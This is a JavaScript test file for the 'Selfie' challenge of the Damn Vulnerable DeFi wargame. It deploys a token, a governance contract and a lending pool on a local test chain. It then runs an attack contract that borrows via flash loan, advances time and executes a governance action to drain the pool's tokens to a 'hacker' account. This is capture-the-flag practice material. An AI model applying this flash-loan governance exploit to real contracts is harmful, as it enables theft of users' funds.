const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");


describe("Selfie Damn Vulnerable DEFI", function(){

    let owner, account1, account2, account3, hacker,
        SimpleGovernance, simpleGovernance,
        SelfiePool, selfiePool,
        TokenSnapsot, tokenSnap,
        SelfieAttack, selfieAttack;



    before(async()=>{

        [owner, account1, account2, account3, hacker] = await ethers.getSigners();

        TokenSnapsot = await ethers.getContractFactory("DamnValuableTokenSnapshot");
        tokenSnap = await TokenSnapsot.deploy(ethers.utils.parseEther("1500000"));
        await tokenSnap.deployed();


        SimpleGovernance = await ethers.getContractFactory("SimpleGovernance");
        simpleGovernance = await SimpleGovernance.deploy(tokenSnap.address);
        await simpleGovernance.deployed();


        SelfiePool = await ethers.getContractFactory("SelfiePool");
        selfiePool = await SelfiePool.deploy(tokenSnap.address, simpleGovernance.address);
        await selfiePool.deployed();


        SelfiePool = await ethers.getContractFactory("SelfiePool");
        selfiePool = await SelfiePool.deploy(tokenSnap.address, simpleGovernance.address);
        await selfiePool.deployed();



        SelfieAttack = await ethers.getContractFactory("SelfieAttack");
        selfieAttack = await SelfieAttack.connect(hacker).deploy(
            selfiePool.address,
            simpleGovernance.address,
            tokenSnap.address
        );
        await selfieAttack.deployed();

        await tokenSnap.connect(owner).transfer(selfiePool.address, tokenSnap.balanceOf(owner.address));

        let SelfiePoolDVTBalance = await tokenSnap.balanceOf(selfiePool.address);
        console.log("Selfie Pool, DVT token Balance;", (SelfiePoolDVTBalance/10**18).toString(), "DVT");
        console.log("");
    });




    it("Exploit",async()=>{
        await selfieAttack.connect(hacker).callFlash();

        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);

        await selfieAttack.connect(hacker).executeFunction(selfieAttack.lastId());

        let balanceHackerDVTAfterExploit = await tokenSnap.balanceOf(hacker.address);
        console.log("Hacker DVT Balance After Exploit", (balanceHackerDVTAfterExploit/10**18).toString(), "DVT");

        let balancePoolDVTAfterExploit = await tokenSnap.balanceOf(selfiePool.address);
        console.log("Pool DVT Balance After Exploit", (balancePoolDVTAfterExploit/10**18).toString(), "DVT");
    });
})